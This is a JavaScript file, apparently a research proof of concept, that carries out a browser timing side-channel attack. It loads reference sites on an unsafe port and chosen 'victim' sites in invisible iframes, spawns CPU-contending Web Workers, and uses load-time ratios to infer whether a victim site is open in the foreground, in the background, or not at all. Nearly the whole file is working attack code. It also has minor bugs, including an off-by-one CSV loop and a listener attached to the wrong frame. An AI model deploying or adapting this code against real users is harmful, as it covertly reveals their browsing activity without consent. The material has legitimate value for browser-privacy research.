const invisible_div = document.getElementById("invisible");
const form = document.getElementById("monitor");
const result = document.getElementById("result");
const submit_button = document.getElementById("submit-btn");
const resultTable = document.getElementById("monitor-results");
const siteSelect = document.getElementById("site");

const CPU_NUM = window.navigator.hardwareConcurrency;

const ref_site_1 = "https://sv.cmu.edu:1";
const ref_site_2 = "https://getbootstrap.com:1";
const helper_site = "https://dribbble.com";

function getDelta(r_bg, r_np) {
  console.log(r_bg, r_np, (r_np - r_bg) / 10);
  return (r_np - r_bg) / 10;
}

function appendTextNode(text, element) {
  const textNode = document.createElement("div");
  textNode.textContent = text;
  element.appendChild(textNode);
}

function appendBaselineResult(text) {
  const textDiv = document.createElement("div");
  textDiv.textContent = text;
  result.setAttribute("data-info", text);
  result.setAttribute("data-r_bg", text && text.split(",")[0].split("=")[1]);
  result.setAttribute("data-r_np", text && text.split(",")[1].split("=")[1]);
  result.appendChild(textDiv);
}

function appendOptionNode(data, tg_element) {
  const { site, rank } = data;
  const optionNode = document.createElement("option");
  optionNode.setAttribute("value", site);
  optionNode.setAttribute("data-rank", rank);
  optionNode.textContent = site;
  tg_element.appendChild(optionNode);
}

function appendTableRow(data, tg_element) {
  const {
    site,
    rank,
    r_time,
    case_type,
    label,
    r_time_one,
    r_time_two,
    r_bg,
    r_np,
  } = data;
  const tr = document.createElement("tr");
  tr.setAttribute(
    "data-info",
    `site=${site},rank=${rank},r_time=${r_time},r_time=${r_time_one},r_time_eq2=${r_time_two},case=${case_type},label=${label},r_bg=${r_bg},r_np=${r_np}`
  );
  const tds = [, site, rank, r_time, r_time_one, r_time_two, case_type, label];
  for (const item of tds) {
    let td = document.createElement("td");
    td.textContent = item;
    tr.appendChild(td);
  }
  tg_element.appendChild(tr);
}

function now() {
  return new Date().toTimeString().substring(0, 8);
}

window.addEventListener("DOMContentLoaded", async function (event) {
  await fetchAndRenderOptions();
  const { r_np, r_bg } = await load_baseline_result();
  console.log("r_np, r_bg", r_np, r_bg);
  save_baseline_results(r_np, r_bg);
  console.log("baseline result saved in cookie:", document.cookie);

  const baseline = `r_bg=${r_bg},r_np=${r_np}`;
  appendBaselineResult(baseline);
  submit_button.removeAttribute("disabled");
});

form.addEventListener("submit", async function (e) {
  e.preventDefault();
  // TODO: for monitoring
  submit_button.setAttribute("disabled", "true");

  let r_time_one = "na";
  let r_time_two = "na";

  const vtm_site = form.site.value;
  const vtm_option = form.site.options[form.site.selectedIndex];
  const vtm_rank = vtm_option.getAttribute("data-rank");
  const { r: r_vtm } = await equation_one(vtm_site);

  let case_type = result.getAttribute("data-case");
  let label = result.getAttribute("data-label");
  const r_bg = result.getAttribute("data-r_bg");
  const r_np = result.getAttribute("data-r_np");

  /*
  (*) 2nd Run Case 1: data-case=1, data-label={fg or bg}, r_time_1={} ,r_time_eq2='na'

  case_type = 1
  result.setAttribute('data-case', "1")
  result.setAttribute('data-label', fg/bg)

  let workers = CPU_NUM - 1;
  await create_invisible_iframe(helper_site, workers)
  const case_one_second_run = await equation_one(vtm_site);
  r_time_1 = case_one_second_run.r
  */
  if (case_type === "1") {
    let workers = CPU_NUM - 1;
    await create_invisible_iframe(helper_site, workers);
    const case_one_second_run = await equation_one(vtm_site);
    r_time_one = case_one_second_run.r;
  }

  /*
  (*) 2nd Run Case 2: data-case=2, data-label={fg or np}, r_time_1='na' ,r_time_eq2={}
  
  case_type = 2
  result.setAttribute('data-case', "2")
  result.setAttribute('data-label', fg/np)
  const eq_twp = await equation_two(vtm_site);
  r_time_two = eq_twp.r;
  
  */
  if (case_type === "2") {
    const eq_twp = await equation_two(vtm_site);
    r_time_two = eq_twp.r;
  }

  // const delta = getDelta(r_bg, r_np);
  // console.log("Math.abs(r_bg - r_np)", Math.abs(r_bg - r_np));
  // console.log("Math.abs(r_vtm - r_bg)", Math.abs(r_vtm - r_bg));
  // console.log("Math.abs(r_vtm - r_np)", Math.abs(r_vtm - r_np));
  // if (Math.abs(r_vtm - r_bg) < delta) {
  //   // decide fg or bg
  //   case_type = "1";
  //   label = "fg/bg";
  // } else if (Math.abs(r_vtm - r_np) < delta) {
  //   // decide fg or np
  //   case_type = "2";
  //   label = "fg/np";
  // }
  const data = {
    site: vtm_site,
    rank: vtm_rank,
    r_time: r_vtm,
    case_type,
    label,
    r_time_one, // for case 1
    r_time_two, // for case 2
    r_bg,
    r_np,
  };
  appendTableRow(data, resultTable);
  // TODO: for monitoring
  submit_button.removeAttribute("disabled");
});

async function equation_one(tg_url) {
  let time_0 = performance.now(); // timestamp click the start to monitor
  let time_ref; // reference_site loaded timestamp
  let time_vtm; // reference_site loaded timestamp
  let r; // (time_vtm - time_ref) / (time_ref - time_0);

  const ref_1 = "ref_1";
  create_invisible_iframe(ref_1);
  const ref_frame_1 = document.getElementById(ref_1);
  ref_frame_1.addEventListener("load", () => {
    time_ref = performance.now();
  });
  const tg = "tg";
  create_invisible_iframe(tg);
  const tg_frame = document.getElementById(tg);
  tg_frame.addEventListener("load", () => {
    time_vtm = performance.now();
  });
  await loadURLonFrame(ref_site_1, ref_frame_1);
  await awaitEvent(ref_frame_1, "load");
  await loadURLonFrame(tg_url, tg_frame);
  await awaitEvent(tg_frame, "load");

  r = (time_vtm - time_ref) / (time_ref - time_0);

  return { time_0, time_ref, time_vtm, r };
}

async function equation_two(tg_url) {
  let time_0 = performance.now();
  let time_ref;
  let time_vtm;
  let time_vtm_2;
  let r;

  const ref_1 = "ref_1";
  create_invisible_iframe(ref_1);
  const ref_frame_1 = document.getElementById(ref_1);
  ref_frame_1.addEventListener("load", () => {
    time_ref = performance.now();
  });
  await loadURLonFrame(ref_site_1, ref_frame_1);
  await awaitEvent(ref_frame_1, "load");

  const tg = "tg";
  create_invisible_iframe(tg);
  const tg_frame = document.getElementById(tg);
  tg_frame.addEventListener("load", () => {
    time_vtm = performance.now();
  });

  const tg_2 = "tg_2";
  create_invisible_iframe(tg_2);
  const tg_frame_2 = document.getElementById(tg_2);
  tg_frame.addEventListener("load", () => {
    time_vtm_2 = performance.now();
  });
  tg_frame.setAttribute("src", "");
  tg_frame_2.setAttribute("src", "");
  tg_frame.setAttribute("src", tg_url);
  tg_frame_2.setAttribute("src", tg_url);
  await awaitEvent(tg_frame, "load");
  await awaitEvent(tg_frame_2, "load");
  vtm_t = time_vtm - time_ref;
  vtm_t_2 = time_vtm_2 - time_ref;

  r = (vtm_t_2 - vtm_t) / vtm_t;

  return { time_0, time_ref, time_vtm, r };
}

async function load_baseline_result() {
  const { r: r_np } = await equation_one(ref_site_2);

  await awaitReset();

  const pre_f2 = "pre_f2";
  create_invisible_iframe(pre_f2);
  await loadURLonFrame(ref_site_2, document.getElementById(pre_f2));
  await awaitEvent(document.getElementById(pre_f2), "load");

  const { r: r_bg } = await equation_one(ref_site_2);

  return { r_np, r_bg };
}

function generate_js_workers(numOfWorkers, task) {
  if (numOfWorkers === 0) return;
  let workers = [];
  // const workerCode = generateWorkerCode();
  for (let i = 0; i < numOfWorkers; i++) {
    const worker = new Worker("/static/worker.js");
    worker.onmessage = function (event) {
      console.log("Worker " + i + " completed task:", event.data);
    };
    worker.onerror = function (event) {
      console.error("Worker " + i + " encountered an error:", event);
    };
    worker.postMessage(task);
    workers.push(worker);
  }
  return workers;
}

// function generate_worker_code() {}

async function create_invisible_iframe(id, numOfWorkers = 0) {
  return new Promise((resolve) => {
    const inv_iframe = document.createElement("iframe");
    inv_iframe.setAttribute("id", `${id}`);
    invisible_div.appendChild(inv_iframe);
    if (numOfWorkers > 0) {
      const task = 1;
      generate_js_workers(numOfWorkers, task);
    }
    resolve();
  });
}

/*
loading a URL: loading a URL with an unsafe port(port1, 22, 23, 24)
victim_site.com = vtm
*/
function loadURLonFrame(url, frame) {
  return new Promise((resolve) => {
    frame.setAttribute("src", `${url}`);
    resolve();
  });
}

function awaitReset() {
  return new Promise((resolve) => {
    invisible_div.innerHTML = "";
    resolve();
  });
}

function awaitEvent(element, eventName) {
  return new Promise((resolve) => {
    element.addEventListener(
      eventName,
      () => {
        resolve();
      },
      { once: true }
    );
  });
}

function save_baseline_results(r_np, r_bg) {
  document.cookie = `r_bg=${r_bg}`;
  document.cookie = `r_np=${r_np}`;
}

async function fetchAndRenderOptions() {
  try {
    // fetch top-300
    const response = await fetch("top-300.csv");
    const csv = await response.text();
    const rows = csv && csv.split("\n");
    let data = [];

    for (let i = 0; i <= rows.length; i++) {
      let cols = rows[i] && rows[i].split(",");
      if (cols[0] && cols[1]) {
        const item = await { rank: cols[0], site: cols[1] };
        // parse csv to js object array
        data.push(item);
        // parse csv to append on select
        appendOptionNode({ rank: cols[0], site: cols[1] }, siteSelect);
      }
    }
  } catch (error) {
    console.log("error", error);
  }
}
